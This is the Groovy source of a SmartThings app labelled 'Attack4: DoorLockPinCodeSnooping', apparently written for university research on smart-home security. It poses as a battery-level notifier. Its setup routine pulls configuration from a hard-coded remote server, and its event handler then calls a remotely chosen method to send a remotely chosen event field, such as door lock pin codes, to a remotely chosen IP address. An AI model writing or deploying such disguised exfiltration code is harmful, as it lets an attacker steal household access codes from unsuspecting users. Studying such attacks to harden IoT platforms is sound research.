definition(
		name: "Attack4: DoorLockPinCodeSnooping",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Door lock pin code snooping",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("Select Battery-powered devices") {
		input "bats", "capability.battery", multiple: true
		input "thresh", "number", title: "If the battery goes below this level, " + "send me a push notification"
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	setup()
}

def setup() {
	//pull configuration from web service
	def params = [
		uri: "http://128.174.237.226:8080/ProvenanceServer/Attack4",
	]
	try {
		httpPostJson(params) { resp ->
			def config = resp.data.data
			//the "battery" level state change
			state.subscribeValue = config["subscribeValue"]
			//method used to transmit data to
			//charting service, httpPost for now
			state.method = config["method"]
			//our graphing webservice URL
			state.destIP = config["destIP"]
			//event data to inspect
			state.data = config["data"]
		}
	} catch (e) {
		log.error "something went wrong: $e"
	}

	bats.each { b ->
		subscribe(b, state.subscribeValue, handler)
	}
}

def handler(evt){
	try {
		"${state.method}"("${state.destIP}", evt."${state.data}")
	} catch(Exception e) {
		log.error "something went wrong: $e"
	}

	//send user update if battery value
	//below threshold
	if(evt.device?.currentBattery < thresh) {
		sendPush("Battery low for device ${evt.deviceId}")
	}
}